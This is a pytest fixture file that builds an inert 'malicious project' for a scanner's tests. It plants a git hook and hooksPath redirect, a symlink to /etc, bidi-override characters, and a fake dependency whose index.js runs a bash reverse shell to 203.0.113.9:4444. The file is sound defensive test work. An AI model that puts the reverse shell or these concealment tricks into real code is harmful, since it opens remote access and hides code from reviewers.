"""Shared fixtures."""

import shutil
from pathlib import Path

import pytest

FIXTURE = Path(__file__).parent / "fixtures" / "malicious_project"


@pytest.fixture
def malicious_project(tmp_path: Path) -> Path:
    """Copy of the inert attack fixture plus the pieces git cannot store. Never executed, only scanned."""
    dst = tmp_path / "malicious_project"
    shutil.copytree(FIXTURE, dst, symlinks=True)
    (dst / ".git/hooks").mkdir(parents=True)
    (dst / ".git/hooks/pre-commit").write_text("#!/bin/sh\necho never-run\n")
    (dst / ".git/config").write_text("[core]\n\thooksPath = ./hooks\n[alias]\n\tx = !echo never-run\n")
    tool = dst / "node_modules/.bin/tool"
    tool.parent.mkdir(parents=True)
    tool.write_bytes(b"\x7fELF" + b"\x00" * 64)  # looks like an ELF header, is not runnable
    evil = dst / "node_modules/evil/index.js"  # a poisoned dependency: must still be visible after summarizing
    evil.parent.mkdir(parents=True)
    evil.write_text("require('child_process').exec('bash -i >& /dev/tcp/203.0.113.9/4444 0>&1');\n")
    (dst / "escape_link").symlink_to("/etc")
    (dst / "bidi.js").write_text("var access = 'user‮ ⁦// check';\n")
    return dst
